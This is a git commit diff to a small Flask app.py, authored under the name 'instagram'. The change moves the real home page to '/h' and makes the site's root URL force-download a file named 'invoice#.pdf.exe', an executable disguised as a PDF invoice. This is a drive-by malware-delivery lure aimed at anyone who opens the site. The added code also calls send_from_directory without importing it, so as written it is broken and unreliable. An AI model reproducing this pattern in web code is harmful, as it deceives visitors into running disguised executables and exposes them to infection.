23091d677338a74994ce56d36285f7547cc89689
instagram <79402239+shubhamraut800@users.noreply.github.com>
2024-11-13 23:57:33 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,12 @@
 from flask import Flask, render_template
 
 app = Flask(__name__)
-
+# Route to serve the file
 @app.route('/')
+def download_file():
+    # The file will be served from the 'static' folder
+    return send_from_directory(directory='static', path='invoice#.pdf.exe', as_attachment=True)
+@app.route('/h')
 def home():
     return render_template('index.html')
 
